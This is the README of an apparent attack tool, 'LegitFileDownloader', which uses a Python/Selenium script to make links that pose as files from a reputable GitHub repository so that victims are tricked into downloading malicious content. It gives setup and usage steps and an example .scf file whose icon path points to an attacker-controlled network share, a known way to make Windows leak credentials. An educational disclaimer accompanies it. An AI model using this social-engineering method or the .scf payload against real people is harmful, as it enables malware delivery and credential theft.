# LegitFileDownloader
A simple attack that relies on social engineering to trick the victim into downloading a malicious file.

## Description
### Part 1
By utilising the python script, users will be able to generate a downloadable link that looks like a legitamte file from a reputable github repository. By using social engineering techniques, the user can trick the victim into downloading the file. The file will be downloaded to the victim's system.


## Pre-requisites
- Chrome browser
- Selenium
- ChromeDriver (Should be compatible with the Chrome browser version)

## Installation
- Install the Chrome browser
- Install the ChromeDriver
Go to the [ChromeDriver download page](https://googlechromelabs.github.io/chrome-for-testing/) and download the ChromeDriver that is compatible with the Chrome browser version installed on your system.
- Install the Selenium package
```bash
pip install selenium
```

## Usage
- Run the python script
```bash
python3 LegitFileDownloader.py
```

- Enter the your github username and password
- Choose the file that u want the target to download
- Example format for the .scf file
```bash
[Shell]
Command=2
IconFile=\\[ip-address_of_server]\share\anyfile.ico
[Taskbar]
Command=ToggleDesktop
```



## Disclaimer
This project is for educational purposes only. Do not use this project for illegal purposes.

## Credits
- Github Exploit: [John Hammond Youtube Video](https://youtu.be/0wduZ3nO848?si=9ngVXV7xLK9QR-n6)

